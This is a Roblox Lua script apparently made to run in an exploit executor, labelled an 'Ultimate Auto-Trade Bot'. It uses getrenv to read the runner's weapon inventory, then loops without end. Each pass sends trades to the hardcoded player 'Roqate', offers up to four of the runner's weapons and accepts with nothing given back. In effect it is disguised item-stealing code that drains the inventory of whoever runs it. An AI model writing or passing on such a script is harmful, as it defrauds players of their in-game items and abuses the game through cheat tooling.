-- Ultimate Auto-Trade Bot with Data-Based Item Detection
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5 -- Seconds between trades
local ITEM_ADD_DELAY = 0.3 -- Delay between adding items

-- Items to exclude
local EXCLUDED_ITEMS = {
    ["Default Knife"] = true,
    ["Default Gun"] = true
}

-- Get the game's environment
local function getGameEnvironment()
    local success, env = pcall(getrenv)
    return success and env or nil
end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- Trade state
local isTrading = false
local lastTradeTime = 0

-- Find player by name
local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

-- Check if trade GUI is open
local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or 
           LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Get all tradable weapons from PlayerData
local function getTradableWeapons()
    local weapons = {}
    local env = getGameEnvironment()
    
    if env and env._G and env._G.PlayerData then
        local playerData = env._G.PlayerData[LocalPlayer.Name]
        if playerData and playerData.Weapons then
            for weaponName, _ in pairs(playerData.Weapons) do
                if not EXCLUDED_ITEMS[weaponName] then
                    table.insert(weapons, weaponName)
                    if #weapons >= MAX_ITEMS_PER_TRADE then
                        break
                    end
                end
            end
        end
    end
    
    return weapons
end

-- Add weapons to trade
local function addWeaponsToTrade()
    local weapons = getTradableWeapons()
    
    if #weapons == 0 then
        warn("No tradable weapons found!")
        return false
    end
    
    for i = 1, math.min(#weapons, MAX_ITEMS_PER_TRADE) do
        TradeRemotes.OfferItem:FireServer(weapons[i], "Weapons")
        wait(ITEM_ADD_DELAY)
    end
    
    return true
end

-- Accept trade
local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("Trade GUI not open!")
        return false
    end
    
    TradeRemotes.AcceptTrade:FireServer(285646582) -- Adjust ID if needed
    return true
end

-- Main trade function
local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then
        return
    end
    
    isTrading = true
    print("Starting trade with " .. targetPlayer.Name .. "...")
    
    -- Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    
    if not success then
        warn("Trade request failed: " .. err)
        isTrading = false
        return
    end
    
    wait(1) -- Wait for trade GUI
    
    if not isTradeGUIOpen() then
        warn("Trade GUI didn't open!")
        isTrading = false
        return
    end
    
    -- Add weapons
    if not addWeaponsToTrade() then
        isTrading = false
        return
    end
    
    -- Accept trade
    if not acceptTrade() then
        warn("Failed to accept trade!")
    else
        print("Trade with " .. targetPlayer.Name .. " completed!")
    end
    
    isTrading = false
    lastTradeTime = os.time()
end

-- Main loop
while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...")
    end
    wait(5) -- Check every 5 seconds
end
